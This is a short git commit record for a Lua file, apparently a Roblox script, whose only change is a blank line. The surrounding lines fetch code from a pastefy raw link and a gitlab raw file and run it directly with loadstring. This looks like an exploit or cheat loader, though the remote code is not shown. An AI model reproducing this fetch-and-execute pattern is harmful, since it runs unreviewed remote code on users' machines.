33eb23663301eed2e342842b45cb71ec10a4aa2f
gscriptt <arvinsalungapogi11@gmail.com>
2025-08-09 06:56:32 +0800

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,3 +1,4 @@
 loadstring(game:HttpGet("https://pastefy.app/cCkDY3ZO/raw"))()
+
 local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
 Spawner.Load()
